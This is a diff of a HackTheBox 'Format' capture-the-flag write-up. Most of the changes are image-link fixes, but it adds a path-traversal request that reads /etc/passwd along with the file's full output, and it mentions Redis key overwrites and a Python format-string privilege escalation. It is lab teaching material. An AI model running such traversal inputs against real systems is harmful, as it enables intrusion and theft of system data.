@@ -49,11 +49,12 @@ add vhost to `/etc/hosts`
 
 **HTTP 80**
 
-![[https://raw.githubusercontent.com/col-1002/Write-ups/main/HackTheBox%20Main%20Machine/Medium/Format/Pasted%20image%2020230517204756.png]]
+![alt text](https://github.com/col-1002/Write-ups/blob/main/HackTheBox%20Main%20Machine/Medium/Format/Pasted%20image%2020230517204756.png)
 
 **HTTP 3000**
 
-![[https://raw.githubusercontent.com/col-1002/Write-ups/main/HackTheBox%20Main%20Machine/Medium/Format/Pasted%20image%2020230517213615.png]]
+![alt text](https://github.com/col-1002/Write-ups/blob/main/HackTheBox%20Main%20Machine/Medium/Format/Pasted%20image%2020230517213615.png)
+
 There are 2 parameters, `id` and `txt`, used for the title and content. We can write to the file as we wish
 ```php
 #http://microblog.htb:3000/cooper/microblog/src/branch/main/microblog/sunny/edit/index.php
@@ -171,6 +172,12 @@ Cookie: username=f5b43mrh60u956rbsgp15nrgai
 Upgrade-Insecure-Requests: 1
 
 id=../../../../../../etc/passwd&header=sss
+```
+
+## Output:
+
+```
+root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologinsystemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologincooper:x:1000:1000::/home/cooper:/bin/bashredis:x:103:33::/var/lib/redis:/usr/sbin/nologingit:x:104:111:Git Version Control,,,:/home/git:/bin/bashmessagebus:x:105:112::/nonexistent:/usr/sbin/nologinsshd:x:106:65534::/run/sshd:/usr/sbin/nologin_laurel:x:997:997::/var/log/laurel:/bin/false
 ```
 
 #### Redis key overwrite
@@ -389,7 +396,7 @@ if(args.provision):
 The username is retrieved from Redis, and if we modify it, we can use Python's format string:
 [Python format string vulnerabilities · Podalirius](https://podalirius.net/en/articles/python-format-string-vulnerabilities/)
 
-![[https://raw.githubusercontent.com/col-1002/Write-ups/main/HackTheBox%20Main%20Machine/Medium/Format/Pasted%20image%2020230518005139.png]]
+![alt text](https://github.com/col-1002/Write-ups/blob/main/HackTheBox%20Main%20Machine/Medium/Format/Pasted%20image%2020230518005139.png)
 
 We change the username in `Redis` 
 ```bash
@@ -462,3 +469,4 @@ _laurel:!:19465::::::
 * [Python format string vulnerabilities · Podalirius](https://podalirius.net/en/articles/python-format-string-vulnerabilities/) 
 * [Redis Cheat Sheet (lzone.de)](https://lzone.de/cheat-sheet/Redis)
 * [Middleware everywhere and lots of misconfigurations to fix | Detectify Labs](https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/)
+* [Profile Link](https://app.hackthebox.com/profile/718010)
